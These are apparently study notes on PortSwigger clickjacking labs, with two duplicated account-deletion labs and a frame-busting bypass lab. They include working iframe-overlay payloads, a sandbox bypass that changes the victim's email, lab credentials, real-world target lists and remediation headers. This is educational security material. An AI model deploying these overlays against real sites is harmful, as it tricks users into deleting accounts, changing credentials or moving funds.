# 🧠 Lab-1 — Delete Account (CSRF-protected button)

---

## 1️⃣ OVERVIEW

This lab demonstrates Clickjacking (UI redressing) where:

> A user is tricked into clicking a hidden “Delete Account” button inside an iframe using a fake clickable overlay.

Even though the button is protected by a CSRF token, clickjacking still works because:

👉 the user performs a REAL click inside their authenticated session

---

## 2️⃣ KEY CONCEPT

Fake UI (Click me) → overlays real website  
Real site (iframe) → executes Delete Account action

---

## 3️⃣ LAB OBJECTIVE

Exploit:

/my-account page

Delete Account button (sensitive action)

CSRF-protected endpoint

👉 Goal: force victim click → delete their account

---

## 4️⃣ WHY CSRF TOKEN DOES NOT HELP HERE

CSRF protects request forgery  
Clickjacking uses real user interaction

So:

CSRF token is valid

request is legitimate

but user is tricked into clicking it

---

## 5️⃣ FINAL WORKING PAYLOAD
```
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

div {
    position: absolute;
    top: 300px;
    left: 60px;
    z-index: 1;
    background: red;
    padding: 10px;
    font-size: 18px;
}
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
---

## 6️⃣ PAYLOAD BREAKDOWN (LINE BY LINE)

---

### 🧩 iframe (real website)
```
iframe {
```
Loads real target website inside attacker page.

---
```
position: relative;
```
Allows positioning inside layout.

---
```
width / height
```
Controls visible area so Delete button is inside view.

---
```
opacity: 0.0001;
```
Makes real site invisible but still clickable.

---
```
z-index: 2;
```
Places iframe above fake UI in stacking order.

---

### 🧩 DIV (fake button)
```
div {
```
Fake clickable element shown to victim.

---
```
position: absolute;
```
Allows precise placement over target button.

---
```
top / left
```
Aligns fake click zone over Delete Account button.

---
```
background: red;
```
Makes button visible and convincing.

---

### 🧩 HTML element
```
<div>Click me</div>
```
This is what victim sees and clicks.

---

### 🧩 iframe source
```
<iframe src=".../my-account"></iframe>
```
Loads authenticated account page containing Delete button.

---

## 7️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

---

### Step 1 — Login

User logs in:

wiener:peter

---

### Step 2 — Target identification

Page contains:

Delete Account button (sensitive action)

---

### Step 3 — Build exploit page

Attacker creates HTML page:

fake “Click me”

hidden iframe with target page

---

### Step 4 — Alignment phase

Adjust:

top

left

opacity (debug mode first)

Until:

Click me overlaps Delete Account button

---

### Step 5 — Deliver exploit

Victim loads page → clicks fake button

---

### Step 6 — Execution

Click → Delete Account request sent inside authenticated session

---

### Step 7 — Lab solved

Account deleted.

---

## 8️⃣ REAL-WORLD SCENARIO

Clickjacking works best on:

---

### 💰 Banking systems

transfer funds

add beneficiary

approve payments

---

### 🔐 Account security

delete account

change email/password

disable MFA

---

### 📦 SaaS platforms

API key regeneration

webhook changes

admin role assignment

---

## 9️⃣ ATTACK VARIATIONS

---

### Variant 1: Fake reward page

“Click to claim prize”
→ deletes account or changes settings

---

### Variant 2: Multi-step clickjacking

Step 1: open settings  
Step 2: confirm deletion

---

### Variant 3: Mobile UI redressing

touch misalignment

gesture-based deception

---

## 0️⃣ WHY THIS ATTACK WORKS

- user is authenticated
- cookies auto-sent to iframe
- CSRF token is already valid
- user performs real click

---

## 1️⃣ REMEDIATION

---

### ❌ X-Frame-Options

DENY / SAMEORIGIN

Prevents iframe embedding.

---

### ❌ CSP frame-ancestors

Controls allowed embedding domains

---

### ❌ UI defenses

confirmation dialogs

re-authentication for sensitive actions

double-click confirmations

---

### ❌ UX protections

avoid single-click destructive actions

add explicit warnings

---

## 2️⃣ KEY SECURITY INSIGHT

Clickjacking does NOT bypass authentication — it abuses user interaction inside an authenticated session.

---

## 🔥 FINAL SUMMARY

- Clickjacking is a UI redressing attack where:

- attacker embeds real site in iframe

- overlays fake clickable element

- user unknowingly clicks real sensitive button

- action executes inside authenticated session

---

# 🧠 Lab-2 — Delete Account (CSRF-protected button)

---

## 1️⃣ OVERVIEW

This lab demonstrates Clickjacking (UI redressing) where:

> A user is tricked into clicking a hidden “Delete Account” button inside an iframe using a fake clickable overlay.

Even though the button is protected by a CSRF token, clickjacking still works because:

👉 the user performs a REAL click inside their authenticated session

---

## 2️⃣ KEY CONCEPT

Fake UI (Click me) → overlays real website  
Real site (iframe) → executes Delete Account action

---

## 3️⃣ LAB OBJECTIVE

Exploit:

/my-account page

Delete Account button (sensitive action)

CSRF-protected endpoint

👉 Goal: force victim click → delete their account

---

## 4️⃣ WHY CSRF TOKEN DOES NOT HELP HERE

CSRF protects request forgery  
Clickjacking uses real user interaction

So:

CSRF token is valid

request is legitimate

but user is tricked into clicking it

---

## 5️⃣ FINAL WORKING PAYLOAD
```
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

div {
    position: absolute;
    top: 300px;
    left: 60px;
    z-index: 1;
    background: red;
    padding: 10px;
    font-size: 18px;
}
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
---

## 6️⃣ PAYLOAD BREAKDOWN (LINE BY LINE)

---

### 🧩 iframe (real website)

iframe {

Loads real target website inside attacker page.

---

position: relative;

Allows positioning inside layout.

---

width / height

Controls visible area so Delete button is inside view.

---

opacity: 0.0001;

Makes real site invisible but still clickable.

---

z-index: 2;

Places iframe above fake UI in stacking order.

---

### 🧩 DIV (fake button)

div {

Fake clickable element shown to victim.

---

position: absolute;

Allows precise placement over target button.

---

top / left

Aligns fake click zone over Delete Account button.

---

background: red;

Makes button visible and convincing.

---

### 🧩 HTML element

<div>Click me</div>

This is what victim sees and clicks.

---

### 🧩 iframe source
```
<iframe src=".../my-account"></iframe>
```
Loads authenticated account page containing Delete button.

---

## 7️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

---

### Step 1 — Login

User logs in:

wiener:peter

---

### Step 2 — Target identification

Page contains:

Delete Account button (sensitive action)

---

### Step 3 — Build exploit page

Attacker creates HTML page:

fake “Click me”

hidden iframe with target page

---

### Step 4 — Alignment phase

Adjust:

top

left

opacity (debug mode first)

Until:

Click me overlaps Delete Account button

---

### Step 5 — Deliver exploit

Victim loads page → clicks fake button

---

### Step 6 — Execution

Click → Delete Account request sent inside authenticated session

---

### Step 7 — Lab solved

Account deleted.

---

## 8️⃣ REAL-WORLD SCENARIO

Clickjacking works best on:

---

### 💰 Banking systems

transfer funds

add beneficiary

approve payments

---

### 🔐 Account security

delete account

change email/password

disable MFA

---

### 📦 SaaS platforms

API key regeneration

webhook changes

admin role assignment

---

## 9️⃣ ATTACK VARIATIONS

---

### Variant 1: Fake reward page

“Click to claim prize”
→ deletes account or changes settings

---

### Variant 2: Multi-step clickjacking

Step 1: open settings  
Step 2: confirm deletion

---

### Variant 3: Mobile UI redressing

touch misalignment

gesture-based deception

---

## 0️⃣ WHY THIS ATTACK WORKS

- user is authenticated
- cookies auto-sent to iframe
- CSRF token is already valid
- user performs real click

---

## 1️⃣ REMEDIATION

---

### ❌ X-Frame-Options

DENY / SAMEORIGIN

Prevents iframe embedding.

---

### ❌ CSP frame-ancestors

Controls allowed embedding domains

---

### ❌ UI defenses

confirmation dialogs

re-authentication for sensitive actions

double-click confirmations

---

### ❌ UX protections

avoid single-click destructive actions

add explicit warnings

---

## 2️⃣ KEY SECURITY INSIGHT

Clickjacking does NOT bypass authentication — it abuses user interaction inside an authenticated session.

---

## 🔥 FINAL SUMMARY

- Clickjacking is a UI redressing attack where:

- attacker embeds real site in iframe

- overlays fake clickable element

- user unknowingly clicks real sensitive button

- action executes inside authenticated session

---

# 🧠 Lab-3 (FRAME BUSTING BYPASS) — COMPLETE NOTES

## 📌 1️⃣ OVERVIEW

Clickjacking is a UI redressing attack where:

User is tricked into clicking a hidden real button while thinking they are clicking a harmless element

It works by:

- Overlaying a transparent iframe
- Aligning fake UI on top of real buttons
- Exploiting trust in visual interfaces

## 📌 2️⃣ WHAT IS THE TOPIC?

This lab covers:

### 🧩 Core concept:

Clickjacking + frame busting bypass

### 🧩 Key idea:

Website tries to block iframe embedding using JavaScript (frame buster)

### 🧩 Attacker goal:

- Bypass frame busting
- Trick user into clicking sensitive action (update email)

## 📌 3️⃣ LAB OBJECTIVE

Force victim to change email address by clicking a fake "Click me" button

## 📌 4️⃣ ATTACK PREREQUISITES

✔ Victim logged in  
✔ Sensitive action exists (Update Email)  
✔ Page is frameable (or bypassed using sandbox)

## 📌 5️⃣ KEY VULNERABILITY

Frame busting script exists:

```javascript
if (window !== window.top) {
    window.top.location = window.location;
}
```

Problem:

- It is client-side JavaScript
- Can be neutralized using browser sandbox

## 📌 6️⃣ BYPASS TECHNIQUE

```html
sandbox="allow-forms"
```

Effect:

✔ allows form submission  
❌ blocks frame-busting escape attempts

## 📌 7️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

### 🟢 Step 1 — Login

wiener:peter

### 🟢 Step 2 — Open exploit server

Inject HTML payload

### 🟢 Step 3 — Load target in iframe

/my-account?email=attacker@email.com

### 🟢 Step 4 — Overlay fake button

Use `<div>` as decoy UI

### 🟢 Step 5 — Align click position

Use:

- opacity = 0.1 (debug)
- adjust top until overlap matches button center

### 🟢 Step 6 — Final attack

Set:

```css
opacity: 0.0001;
```

### 🟢 Step 7 — Deliver exploit

Victim clicks → email changes → lab solved

## 📌 8️⃣ FINAL PAYLOAD (WORKING VERSION)

```html
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

div {
    position: absolute;
    top: 485px;
    left: 80px;
    z-index: 1;
}
</style>

<div>CLICK ME</div>

<iframe
sandbox="allow-forms"
src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@email.com">
</iframe>
```

## 📌 9️⃣ PAYLOAD BREAKDOWN

### 🧩 iframe

Loads real victim page inside attacker page

### 🧩 sandbox

Prevents frame busting script from escaping iframe

### 🧩 email parameter

Pre-fills form automatically to speed attack

### 🧩 div (fake button)

Visible UI that user clicks instead of real button

### 🧩 top + left

Controls pixel alignment between fake and real button

### 🧩 opacity

Makes real page invisible but still clickable

## 📌 10️⃣ REAL-WORLD SCENARIOS

### 🧨 1. Banking apps

- “Confirm transfer”
- “Change email”
- “Add beneficiary”

### 🧨 2. Social media

- “Follow user”
- “Like post”
- “Change settings”

### 🧨 3. Admin panels

- delete user
- change role
- reset password

## 📌 11️⃣ VARIATIONS

### 🔹 Clickjacking + CSRF combo

Click triggers state-changing request with victim session

### 🔹 Prefilled attack

URL parameters pre-fill sensitive form values

### 🔹 Hidden iframe navigation

Multiple pages chained inside iframe

## 📌 12️⃣ MULTI-CHAIN ATTACK MODEL

Click → iframe action → authenticated request → sensitive change → backend update

## 📌 13️⃣ REMEDIATION

### 🛡️ 1. X-Frame-Options

```http
DENY
SAMEORIGIN
```

Blocks iframe embedding.

### 🛡️ 2. CSP frame-ancestors

```http
frame-ancestors 'none';
```

Modern and stronger protection.

### 🛡️ 3. Avoid UI-based sensitive actions

- Require re-authentication
- Use confirmation tokens

### 🛡️ 4. CSRF tokens (NOT enough alone)

CSRF does NOT stop clickjacking

## 📌 14️⃣ KEY MINDSET

Clickjacking is not about hacking code — it's about hacking human perception of UI

## 🔥 FINAL ONE-LINE SUMMARY

Clickjacking works by hiding a real sensitive button inside an iframe and tricking the user into clicking it through a fake UI, bypassed in this lab using sandbox + pixel-perfect alignment.

If you want next, I can upgrade your understanding to:

👉 “real bug bounty clickjacking techniques (zero-frame-busting + CSP bypass + multi-step attacks)”
